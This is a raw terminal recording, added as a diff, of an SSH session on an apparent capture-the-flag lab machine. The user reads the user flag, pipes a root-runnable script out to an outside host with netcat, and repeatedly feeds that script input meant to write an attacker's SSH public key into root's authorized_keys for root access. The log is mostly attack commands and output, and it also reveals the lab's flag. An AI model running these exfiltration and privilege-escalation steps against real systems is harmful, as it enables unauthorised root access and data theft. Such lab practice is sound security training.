@@ -1,0 +1,166 @@
+Script started on 2025-01-21 23:48:42+03:00 [COMMAND="ssh deku@ua.high.school.thm" TERM="xterm-256color" TTY="/dev/pts/6" COLUMNS="104" LINES="27"]
+deku@ua.high.school.thm's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-153-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue 21 Jan 2025 08:48:50 PM UTC
+
+  System load:  0.0               Processes:             121
+  Usage of /:   47.0% of 9.75GB   Users logged in:       0
+  Memory usage: 49%               IPv4 address for eth0: 10.10.76.64
+  Swap usage:   0%
+
+
+ * Introducing Expanded Security Maintenance for Applications.
+   Receive updates to over 25,000 software packages with your
+   Ubuntu Pro subscription. Free for personal use.
+
+     https://ubuntu.com/pro
+
+Expanded Security Maintenance for Applications is not enabled.
+
+37 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Jan 21 20:41:40 2025 from 10.9.3.166
+]0;deku@myheroacademia: ~[01;32mdeku@myheroacademia[00m:[01;34m~[00m$ ls
+user.txt
+]0;deku@myheroacademia: ~[01;32mdeku@myheroacademia[00m:[01;34m~[00m$ cat user.txt
+THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
+]0;deku@myheroacademia: ~[01;32mdeku@myheroacademia[00m:[01;34m~[00m$ sudo -l
+[sudo] password for deku: 
+Matching Defaults entries for deku on myheroacademia:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User deku may run the following commands on myheroacademia:
+    (ALL) /opt/NewComponent/feedback.sh
+]0;deku@myheroacademia: ~[01;32mdeku@myheroacademia[00m:[01;34m~[00m$ cat /opt/NewComponent/feedback.sh | nc 10.9.3.166 9999
+]0;deku@myheroacademia: ~[01;32mdeku@myheroacademia[00m:[01;34m~[00m$ ./opt/NewComponent/feedback.sh
+-bash: ./opt/NewComponent/feedback.sh: No such file or directory
+]0;deku@myheroacademia: ~[01;32mdeku@myheroacademia[00m:[01;34m~[00m$ cd /opt/NwComponent
+-bash: cd: /opt/NwComponent: No such file or directory
+]0;deku@myheroacademia: ~[01;32mdeku@myheroacademia[00m:[01;34m~[00m$ cd /opt/NwComponentewComponent
+]0;deku@myheroacademia: /opt/NewComponent[01;32mdeku@myheroacademia[00m:[01;34m/opt/NewComponent[00m$ ls
+[0m[01;32mfeedback.sh[0m
+]0;deku@myheroacademia: /opt/NewComponent[01;32mdeku@myheroacademia[00m:[01;34m/opt/NewComponent[00m$ ./feedbacl[Kk.sh
+Hello, Welcome to the Report Form       
+This is a way to report various problems
+    Developed by                        
+        The Technical Department of U.A.
+Enter your feedback:
+/opt/NewComponent/feedback.sh                             ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ/vVwPbH6N1nv0VCowa7vjxhpsqPdAUUP3sY4J63p1I h471x@winux >                                      ^[  ^[  ^[  ^[  ^[  ^[  ^[  ^[  ^[  ^[  ^[  ^[  ^[  ^[  ^[  ^[  ^[  ^[  ^H^H^H                                                                ^C
+]0;deku@myheroacademia: /opt/NewComponent[01;32mdeku@myheroacademia[00m:[01;34m/opt/NewComponent[00m$ nc -lvp 9999 > h471x.key.pub
+-bash: h471x.key.pub: Permission denied
+]0;deku@myheroacademia: /opt/NewComponent[01;32mdeku@myheroacademia[00m:[01;34m/opt/NewComponent[00m$ nc -lvp 9999 > h471x.key.pub/h471x.key.pubth471x.key.pubmh471x.key.pubph471x.key.pub[1Ph471x.key.pub[1Ph471x.key.pub[1Ph471x.key.pub[1Ph471x.key.pub~h471x.key.pub/h471x.key.pub
+nc: getnameinfo: Temporary failure in name resolution
+]0;deku@myheroacademia: /opt/NewComponent[01;32mdeku@myheroacademia[00m:[01;34m/opt/NewComponent[00m$ nc -lvp 9999 > ~/h471x.key.pub[1P/h471x.key.pub[C/h471x.key.pubh/h471x.key.pubo/h471x.key.pubm/h471x.key.pube/h471x.key.pub[C/h471x.key.pubd/h471x.key.pube/h471x.key.pubk/h471x.key.pubu/h471x.key.pub
+nc: getnameinfo: Temporary failure in name resolution
+]0;deku@myheroacademia: /opt/NewComponent[01;32mdeku@myheroacademia[00m:[01;34m/opt/NewComponent[00m$ cd
+]0;deku@myheroacademia: ~[01;32mdeku@myheroacademia[00m:[01;34m~[00m$ cdnc -lvp 9999 > /home/deku/h471x.key.pub[1Ph471x.key.pub[1Ph471x.key.pub[1Ph471x.key.pub[1Ph471x.key.pub[1Ph471x.key.pub[1Ph471x.key.pub[1Ph471x.key.pub[1Ph471x.key.pub[1Ph471x.key.pub[1P471x.key.pub[1Ph471x.key.pub
+nc: getnameinfo: Temporary failure in name resolution
+]0;deku@myheroacademia: ~[01;32mdeku@myheroacademia[00m:[01;34m~[00m$ ec[K[Kcd -
+/opt/NewComponent
+]0;deku@myheroacademia: /opt/NewComponent[01;32mdeku@myheroacademia[00m:[01;34m/opt/NewComponent[00m$ echo test >test
+-bash: test: Permission denied
+]0;deku@myheroacademia: /opt/NewComponent[01;32mdeku@myheroacademia[00m:[01;34m/opt/NewComponent[00m$ cd -
+/home/deku
+]0;deku@myheroacademia: ~[01;32mdeku@myheroacademia[00m:[01;34m~[00m$ echo test >test
+]0;deku@myheroacademia: ~[01;32mdeku@myheroacademia[00m:[01;34m~[00m$ ls
+h471x.key.pub  test  user.txt
+]0;deku@myheroacademia: ~[01;32mdeku@myheroacademia[00m:[01;34m~[00m$ rm h471x.key.pub test
+]0;deku@myheroacademia: ~[01;32mdeku@myheroacademia[00m:[01;34m~[00m$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ/vVwPbH6N1nv0VCowa7vjxhpsqPdAUUP3sY4J63p1I h471x@winux" h471x.key.pub
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ/vVwPbH6N1nv0VCowa7vjxhpsqPdAUUP3sY4J63p1I h471x@winux h471x.key.pub
+]0;deku@myheroacademia: ~[01;32mdeku@myheroacademia[00m:[01;34m~[00m$ ls
+user.txt
+]0;deku@myheroacademia: ~[01;32mdeku@myheroacademia[00m:[01;34m~[00m$ lsecho "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ/vVwPbH6N1nv0VCowa7vjxhpsqPdAUUP3sY4J63p1I h471x@winux" h471x.key.pub[C>h471x.key.pub h471x.key.pub
+]0;deku@myheroacademia: ~[01;32mdeku@myheroacademia[00m:[01;34m~[00m$ ls
+h471x.key.pub  user.txt
+]0;deku@myheroacademia: ~[01;32mdeku@myheroacademia[00m:[01;34m~[00m$ cat h471x.key.pub 
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ/vVwPbH6N1nv0VCowa7vjxhpsqPdAUUP3sY4J63p1I h471x@winux
+]0;deku@myheroacademia: ~[01;32mdeku@myheroacademia[00m:[01;34m~[00m$ cd -
+/opt/NewComponent
+]0;deku@myheroacademia: /opt/NewComponent[01;32mdeku@myheroacademia[00m:[01;34m/opt/NewComponent[00m$ ./feedback.sh 
+Hello, Welcome to the Report Form       
+This is a way to report various problems
+    Developed by                        
+        The Technical Department of U.A.
+Enter your feedback:
+cat /home/deku/h471x.key.pub /root/.ssh/^[[D                 > root    /root/.ssh/authoris zed_keys
+It is This:
+./feedback.sh: line 14: /root/.ssh/authorized_keys: Permission denied
+Feedback successfully saved.
+]0;deku@myheroacademia: /opt/NewComponent[01;32mdeku@myheroacademia[00m:[01;34m/opt/NewComponent[00m$ ./feedback.sh [1@s[1@u[1@d[1@o[1@ 
+Hello, Welcome to the Report Form       
+This is a way to report various problems
+    Developed by                        
+        The Technical Department of U.A.
+Enter your feedback:
+cat     cat /home/deku/h471x.key.pub > /root/.ssh/authorized_keys
+It is This:
+Feedback successfully saved.
+]0;deku@myheroacademia: /opt/NewComponent[01;32mdeku@myheroacademia[00m:[01;34m/opt/NewComponent[00m$ sudo ./feedback.sh 
+Hello, Welcome to the Report Form       
+This is a way to report various problems
+    Developed by                        
+        The Technical Department of U.A.
+Enter your feedback:
+cat /root/.ssh/authorized_keys
+It is This:
+cat /root/.ssh/authorized_keys
+Feedback successfully saved.
+]0;deku@myheroacademia: /opt/NewComponent[01;32mdeku@myheroacademia[00m:[01;34m/opt/NewComponent[00m$ cat /vat[Kr/log/feedbackl[K[Kk.txt
+]0;deku@myheroacademia: /opt/NewComponent[01;32mdeku@myheroacademia[00m:[01;34m/opt/NewComponent[00m$ cd /var/log
+]0;deku@myheroacademia: /var/log[01;32mdeku@myheroacademia[00m:[01;34m/var/log[00m$ ls
+alternatives.log                   btmp.1                 [0m[01;31mkern.log.4.gz[0m
+alternatives.log.1                 cloud-init.log         [01;34mlandscape[0m
+[01;34mamazon[0m                             cloud-init-output.log  lastlog
+[01;34mapache2[0m                            [01;34mdist-upgrade[0m           [01;34mprivate[0m
+[01;34mapt[0m                                dmesg                  syslog
+auth.log                           dmesg.0                syslog.1
+auth.log.1                         [01;31mdmesg.1.gz[0m             [01;31msyslog.2.gz[0m
+[01;31mauth.log.2.gz[0m                      [01;31mdmesg.2.gz[0m             [01;31msyslog.3.gz[0m
+[01;31mauth.log.3.gz[0m                      [01;31mdmesg.3.gz[0m             [01;31msyslog.4.gz[0m
+[01;31mauth.log.4.gz[0m                      [01;31mdmesg.4.gz[0m             [01;31msyslog.5.gz[0m
+aws114_ssm_agent_installation.log  dpkg.log               [01;31msyslog.6.gz[0m
+boot.log                           dpkg.log.1             [01;31msyslog.7.gz[0m
+boot.log.1                         [01;31mdpkg.log.2.gz[0m          ubuntu-advantage.log
+boot.log.2                         faillog                ubuntu-advantage.log.1
+boot.log.3                         [01;36mfeedback.txt[0m           ubuntu-advantage-timer.log
+boot.log.4                         [01;34minstaller[0m              ubuntu-advantage-timer.log.1
+boot.log.5                         [01;34mjournal[0m                [01;31mubuntu-advantage-timer.log.2.gz[0m
+boot.log.6                         kern.log               [01;31mubuntu-advantage-timer.log.3.gz[0m
+boot.log.7                         kern.log.1             [01;34munattended-upgrades[0m
+bootstrap.log                      [01;31mkern.log.2.gz[0m          wtmp
+btmp                               [01;31mkern.log.3.gz[0m
+]0;deku@myheroacademia: /var/log[01;32mdeku@myheroacademia[00m:[01;34m/var/log[00m$ cat feedback.txt 
+]0;deku@myheroacademia: /var/log[01;32mdeku@myheroacademia[00m:[01;34m/var/log[00m$ cd -
+/opt/NewComponent
+]0;deku@myheroacademia: /opt/NewComponent[01;32mdeku@myheroacademia[00m:[01;34m/opt/NewComponent[00m$ ls
+[0m[01;32mfeedback.sh[0m
+]0;deku@myheroacademia: /opt/NewComponent[01;32mdeku@myheroacademia[00m:[01;34m/opt/NewComponent[00m$ sudo ./feedback.sh 
+Hello, Welcome to the Report Form       
+This is a way to report various problems
+    Developed by                        
+        The Technical Department of U.A.
+Enter your feedback:
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ/vVwPbH6N1nv0VCowa7vjxhpsqPdAUUP3sY4J63p1I h471x@winux > /root/.ssh/authorized_keys
+It is This:
+Feedback successfully saved.
+]0;deku@myheroacademia: /opt/NewComponent[01;32mdeku@myheroacademia[00m:[01;34m/opt/NewComponent[00m$ exit
+logout
+Connection to ua.high.school.thm closed.
+
+Script done on 2025-01-22 00:06:56+03:00 [COMMAND_EXIT_CODE="0"]
